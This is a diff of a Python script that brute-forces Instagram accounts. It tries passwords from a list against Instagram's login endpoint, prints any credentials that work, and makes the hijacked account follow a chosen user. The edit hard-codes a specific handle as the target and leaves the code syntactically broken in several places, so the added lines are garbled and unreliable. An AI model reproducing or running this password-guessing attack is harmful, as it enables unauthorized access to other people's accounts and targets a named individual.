@@ -24,7 +24,7 @@ def userExists(username):
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'username':nur.hh,'id':fUserID}
 
 
 def Login(username,password):
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'username':'nur.hh,:password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,36 +67,36 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
+def follow(sess, username):nur.hh
+	username = userExists(nur.hh)
 	if (username == False):
 		return	
 	else:
-		userID = username['id']
+		userID = nur.hh['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
+username = str(input('Please enter a username:nur.hh '))
+username = userExists(nur.hh)
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	username = username['nur.hh']
 
 
 
-delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
+delayLoop = int(input('Please add delay between the passwords (in seconds): 1')) 
 
 
-for i in range(len(passwords)):
-	password = passwords[i]
-	sess = Login(username,password)
+for i in range(len)):
+	password = [i] password
+	sess = Login(nur.hh,)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [nur.hh,])
 
 		#because i am cool
-		follow(sess,'avr_amit')
+		follow(sess,'nur.hh')
 
 	try:
 		time.sleep(delayLoop)
@@ -105,6 +105,5 @@ for i in range(len(passwords)):
 		if (an == 'y'):
 			exit()
 		else:
-			continue
+			continue password 
 		
-
